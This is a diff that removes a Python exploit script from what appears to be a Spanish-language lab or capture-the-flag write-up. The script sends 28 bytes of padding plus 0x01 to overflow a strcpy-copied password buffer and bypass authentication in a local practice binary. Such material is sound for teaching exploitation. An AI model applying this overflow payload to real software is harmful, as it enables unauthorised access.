@@ -191,33 +191,3 @@ gdb ./rompiendo-autenticacion.out
 # Explotación
 python3 exploit.py
 ```
-#!/usr/bin/env python3
-"""
-Exploit para "Rompiendo Autenticacion"
-Bypass de autenticacion mediante buffer overflow de stack.
-
-Vulnerabilidad: strcpy() sin control de limites sobre password_buffer[16],
-lo que permite sobrescribir la variable auth_flag ubicada 28 bytes mas
-adelante en el stack frame.
-
-Uso:
-    python3 exploit.py [ruta_al_binario]
-"""
-
-import subprocess
-import sys
-
-BINARY = sys.argv[1] if len(sys.argv) > 1 else "./rompiendo-autenticacion.out"
-
-# 28 bytes de relleno hasta auth_flag + 0x01 para dejarlo en 1
-OFFSET = 28
-payload = b"A" * OFFSET + b"\x01"
-
-result = subprocess.run(
-    [BINARY, payload],
-    capture_output=True
-)
-
-print("STDOUT:", result.stdout.decode(errors="replace"))
-print("STDERR:", result.stderr.decode(errors="replace"))
-print("Return code:", result.returncode)
